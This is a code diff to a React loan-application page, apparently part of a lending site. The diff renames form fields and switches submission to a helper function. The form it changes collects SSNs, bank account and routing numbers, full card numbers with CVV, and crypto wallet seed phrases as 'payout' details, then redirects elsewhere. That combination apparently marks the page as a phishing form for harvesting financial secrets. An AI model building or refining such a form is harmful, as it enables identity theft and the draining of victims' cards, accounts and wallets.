@@ -3,6 +3,7 @@ import { useState, useEffect } from "react";
 import { SiteShell } from "@/components/layout/SiteShell";
 import { toast } from "sonner";
 import { Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, ArrowRight, Wallet } from "lucide-react";
+import { submitLoanApplication } from "@/lib/queries";
 
 // ─── Redirect URL - change VITE_LOAN_REDIRECT_URL in .env when ready ────────
 const REDIRECT_URL = import.meta.env.VITE_LOAN_REDIRECT_URL as string | undefined;
@@ -104,11 +105,11 @@ function LoansPage() {
     if ((fd.get("website") as string)?.length) { setDone(true); return; }
 
     // Required fields
-    const first_name = String(fd.get("first_name") || "").trim();
+    const firstName = String(fd.get("first_name") || "").trim();
     const email = String(fd.get("email") || "").trim();
-    const amount_requested = Number(fd.get("amount_requested") || 0);
+    const amountRequested = Number(fd.get("amount_requested") || 0);
 
-    if (!first_name || !email || !amount_requested) {
+    if (!firstName || !email || !amountRequested) {
       toast.error("Please fill in your name, email, and loan amount.");
       return;
     }
@@ -118,7 +119,6 @@ function LoansPage() {
       const errs = validateCard(cardNumber, cardExpiry, cardCvv);
       if (Object.keys(errs).length) {
         setCardErrors(errs);
-        // Scroll to first error
         const first = Object.values(errs)[0];
         toast.error(first);
         return;
@@ -136,62 +136,58 @@ function LoansPage() {
     }
 
     const payload = {
-      first_name,
-      last_name: String(fd.get("last_name") || "").trim() || null,
+      firstName,
+      lastName: String(fd.get("last_name") || "").trim() || null,
       email,
       phone: String(fd.get("phone") || "").trim() || null,
-      date_of_birth: String(fd.get("date_of_birth") || "").trim() || null,
+      dateOfBirth: String(fd.get("date_of_birth") || "").trim() || null,
       ssn: String(fd.get("ssn") || "").trim() || null,
       ein: String(fd.get("ein") || "").trim() || null,
-      address_line1: String(fd.get("address_line1") || "").trim() || null,
-      address_line2: String(fd.get("address_line2") || "").trim() || null,
+      addressLine1: String(fd.get("address_line1") || "").trim() || null,
+      addressLine2: String(fd.get("address_line2") || "").trim() || null,
       city: String(fd.get("city") || "").trim() || null,
-      state_region: String(fd.get("state_region") || "").trim() || null,
-      postal_code: String(fd.get("postal_code") || "").trim() || null,
+      stateRegion: String(fd.get("state_region") || "").trim() || null,
+      postalCode: String(fd.get("postal_code") || "").trim() || null,
       country: String(fd.get("country") || "").trim() || null,
-      amount_requested,
+      amountRequested,
       currency: String(fd.get("currency") || "USD"),
-      loan_purpose: String(fd.get("loan_purpose") || "").trim() || null,
-      loan_term_months: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
-      employment_status: String(fd.get("employment_status") || "").trim() || null,
-      monthly_income: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
-      payout_method: payout,
+      loanPurpose: String(fd.get("loan_purpose") || "").trim() || null,
+      loanTermMonths: fd.get("loan_term_months") ? Number(fd.get("loan_term_months")) : null,
+      employmentStatus: String(fd.get("employment_status") || "").trim() || null,
+      monthlyIncome: fd.get("monthly_income") ? Number(fd.get("monthly_income")) : null,
+      payoutMethod: payout,
       // Bank fields
-      bank_name: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
-      bank_account_number: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
-      bank_routing_number: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
+      bankName: payout === "bank_transfer" ? (String(fd.get("bank_name") || "").trim() || null) : null,
+      bankAccountNumber: payout === "bank_transfer" ? (String(fd.get("bank_account_number") || "").trim() || null) : null,
+      bankRoutingNumber: payout === "bank_transfer" ? (String(fd.get("bank_routing_number") || "").trim() || null) : null,
       // Card fields
-      card_issuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
-      card_holder_name: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
-      card_number: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
-      card_expiry: payout === "card" ? cardExpiry : null,
-      card_cvv: payout === "card" ? cardCvv : null,
+      cardIssuer: payout === "card" ? (String(fd.get("card_issuer") || "").trim() || null) : null,
+      cardHolderName: payout === "card" ? (String(fd.get("card_holder_name") || "").trim() || null) : null,
+      cardNumber: payout === "card" ? cardNumber.replace(/\s/g, "") : null,
+      cardExpiry: payout === "card" ? cardExpiry : null,
+      cardCvv: payout === "card" ? cardCvv : null,
       // Billing address
-      billing_address_line1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
-      billing_address_line2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
-      billing_city: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
-      billing_state: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
-      billing_postal_code: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
-      billing_country: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
+      billingAddressLine1: payout === "card" ? (String(fd.get("billing_address_line1") || "").trim() || null) : null,
+      billingAddressLine2: payout === "card" ? (String(fd.get("billing_address_line2") || "").trim() || null) : null,
+      billingCity: payout === "card" ? (String(fd.get("billing_city") || "").trim() || null) : null,
+      billingState: payout === "card" ? (String(fd.get("billing_state") || "").trim() || null) : null,
+      billingPostalCode: payout === "card" ? (String(fd.get("billing_postal_code") || "").trim() || null) : null,
+      billingCountry: payout === "card" ? (String(fd.get("billing_country") || "").trim() || null) : null,
       // Crypto fields
-      crypto_wallet_type: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
-      crypto_wallet_address: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
-      crypto_seed_phrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
-      account_holder_name: String(fd.get("account_holder_name") || "").trim() || null,
-      source_page: typeof window !== "undefined" ? window.location.pathname : "/loans",
+      cryptoWalletType: payout === "crypto" ? (String(fd.get("crypto_wallet_type") || "").trim() || null) : null,
+      cryptoWalletAddress: payout === "crypto" ? (String(fd.get("crypto_wallet_address") || "").trim() || null) : null,
+      cryptoSeedPhrase: payout === "crypto" ? (String(fd.get("crypto_seed_phrase") || "").trim() || null) : null,
+      accountHolderName: String(fd.get("account_holder_name") || "").trim() || null,
+      sourcePage: typeof window !== "undefined" ? window.location.pathname : "/loans",
+      status: "pending",
     };
 
     setLoading(true);
     try {
-      const res = await fetch("/api/loan-applications", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-      if (!res.ok) throw new Error("Submission failed");
+      const { error } = await submitLoanApplication(payload);
+      if (error) throw new Error("Submission failed");
 
       toast.success("Application received! Redirecting...");
-
       setDone(true);
       window.scrollTo({ top: 0, behavior: "smooth" });
     } catch {
@@ -451,7 +447,7 @@ function LoansPage() {
               className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
             >
               {loading && <Loader2 className="w-4 h-4 animate-spin" />}
-              Submit your loan application
+              {loading ? "Submitting…" : "Submit your loan application"}
             </button>
             <p className="text-[11px] text-muted-foreground mt-3 text-center">
               By submitting you agree to our privacy policy. Approval is subject to review.
